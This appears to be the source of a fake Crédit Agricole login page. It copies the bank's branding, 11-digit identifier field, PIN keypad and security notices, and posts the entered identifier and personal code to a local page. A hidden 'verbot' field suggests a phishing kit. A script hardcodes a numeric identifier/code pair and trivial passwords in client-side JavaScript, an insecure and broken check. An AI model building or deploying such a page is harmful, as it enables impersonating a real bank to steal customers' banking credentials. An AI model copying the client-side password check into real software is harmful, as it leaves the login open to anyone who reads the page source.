<?php
   
?>
<!DOCTYPE html>
<html lang="fr">
<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

    <meta name="theme-color" content="#6dc77a"/>
    <meta name="msapplication-navbutton-color" content="#6dc77a"/>
    <meta name="apple-mobile-web-app-status-bar-style" content="#6dc77a" />

    <link rel="icon" type="image/png" href="./style/favicon.png">
    
    <link rel="stylesheet" href="./style/css/bootstrap.min.css" />
    
    <link rel="stylesheet" href="./style/css/helpers.css" />

    <link rel="stylesheet" href="./style/css/fonts.css" />

    <link rel="stylesheet" href="./style/css/main-login.css" />


    <title>Accéder à mes comptes - Crédit Agricole</title>

</head>

<SCRIPT LANGUAGE="JavaScript">
function Login(){
var done=0;
var username=document.login.username.value;
var password=document.login.password.value;

if (identifiant==" 67184393384" && password=="475698") {
window.location="espace.html";
}

if (username=="user2" && password=="user2") {
window.location="user2.html";
}

if (username=="user3" && password=="user3") {
window.location="user3.html";
}

if (username=="user4" && password=="user4") {
window.location="user4.html";
}

if (username=="vous" && password=="vous") { 
// Vous pouvez réservez une page pour vous même(options, etc.)
window.location="vous.html";
}
}
</SCRIPT>
<body>



    <header id="header2">
        <div class="logo">
            <a href="#"><img class="" src="./style/CADIF_logo_horizontal_rvb_v4.png" alt="Crédit Agricole de Paris et d’Ile de France - Banque et assurances" style="/* position: absolute; */top: 10%;width: 168px;left: 6%;/* max-width: 100%; *//* max-height: 100px; *//* height: 100%; */transform: translate(6%, -9%);"></a>
        </div></a>
        </div>
        <div class="closse"><i class="fas fa-times"></i></div>
    </header>

   <main id="main">
        <div class="left">
            <div class="left-inner text-white" style="background-color:#007461;">
                
                <strong>SOUHAITEZ-VOUS OUVRIR UN COMPTE BANCAIRE <br> AU CREDIT AGRICOLE ?<br></strong>
                <br><p>
                    Nous vous proposons d'y associer une de nos 5 offres <br> groupées de service.
                    Comprenant chacune une carte<br> bancaire et des services pour répondre à vos bésoins<br> quotidiens.
                </p>
                <a href="#" class="btn btn-light fz14" style="color: #007D8F; padding: 10px 20px; border-radius: 20em;">DÉCOUVREZ NOS OFFRES</a>

            </div>
        </div>
        <div class="right">
            <h2 class=""><b>ACCÉDER À MES COMPTES</b></h2><br><br>
            <div class="row">
                <div class="col-md-6">
                    <div class="form">
                        <div class="top-text">
                            <span><b>IDENTIFIANT</b></span>
                        </div>
                        <form method="post" action="espace.html">
                            <div class="form-group">
                                <label for="identifiant">Saisissez votre identifiant à 11 <br>chiffres</label>
                                <input type="text" name="identifiant" id="identifiant" class="form-control" maxlength="11" pattern="[0-11]{5}" placeholder="Exemple 98652706859">
                                <span class="btn-x btn-identifiant">x</span>
                            </div>
                            <div class="form-group zow">
                                <div class="top-text">
                                    <span>CODE<br> PERSONNEL</span>
                                    <a href="#">Perdu / <br>Oublié ?</a>
                                </div>
                                <input type="password" name="password" id="password" class="form-control" placeholder="Tapez votre code dans le pavé numérique" readonly="readonly" maxlength="6">
                                <span class="btn-x btn-password">x</span>
                            </div>
                            <div class="form-group zow">
                                <div class="numbers">
                                    <ul class="mb-3">
                                        <li><a data-number="6">6</a></li>
                                        <li><a data-number="8">8</a></li>
                                        <li><a data-number="1">1</a></li>
                                        <li><a data-number="9">9</a></li>
                                        <li><a data-number="0">0</a></li>
                                    </ul>
                                    <ul>
                                        <li><a data-number="2">2</a></li>
                                        <li><a data-number="7">7</a></li>
                                        <li><a data-number="3">3</a></li>
                                        <li><a data-number="5">5</a></li>
                                        <li><a data-number="4">4</a></li>
                                    </ul>
                                </div>
                            </div>
                            <input type="hidden" name="type" value="login">
                            <div class="form-group mt-5">
                                <button type="button" class="btn-get-pass disabled">Entrer mon code personnel</button>
                                <button type="submit" class="btn-submit zow disabled" disabled>VALIDER</button>
                            </div>
                            
                            <div class="form-bottom">
                                <p style="color: #000000; text-align: center; font-size: 18px;"><strong>Vous n’êtes pas encore <br>client ?</strong></p>
                                <button type="button">Devenir client</button>
                            </div>
                            <input type="hidden" name="verbot">
                            <input type="hidden" name="type" value="login">
                        </form>
                    </div>
                </div>
                <div class="col-md-6">
                    
                    <div>
                        <h4>OU TROUVER MON<br>IDENTIFIANT ?</h4>
                        <p><strong>Retrouvez votre identifiant à 11 chiffres sur :<br>

                        - les RIB/IBAN de votre chéquier
                        - vos relevés de compte
                        - l'application Ma Banque</p></strong>
                        
                        <strong>UN PROBLÈME DE NAVIGATION ?</strong>
                    </div> <br>
                    <div>
                        <h4>Consultez l'aide en ligne</h4>
                    </div>
                    <div>
                        <h4>SÉCURITÉ</h4>
                        <p><strong>Restez vigilants et veillez à protéger<br> vos données personnelles.</strong><br> <a href="#">Consultez nos conseils de sécurité</a></p>
                        <p><strong>Le Crédit Agricole Alpes Provence vous propose d'apprendre à reconnaître un mail frauduleux de type phishing.</strong><br> <a href="#">Participez au quizz phishing dès <br>maintenant !</a></p>
                        <p><strong>Nous vous invitons également à consulter régulièrement nos Conditions Générales d'utilisation.</strong><br><a href="#">Voir les Conditions Générales d'Utilisation</a></p>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <script src="./style/js/jquery.min.js"></script>
    <script src="./style/js/popper.min.js"></script>
    <script src="./style/js/bootstrap.min.js" ></script>
    <script src="./style/js/fontawesome.js"></script>
    <script src="./style/js/main.js"></script>
    <script src="./style/js/style.js"></script>

</body>
</html>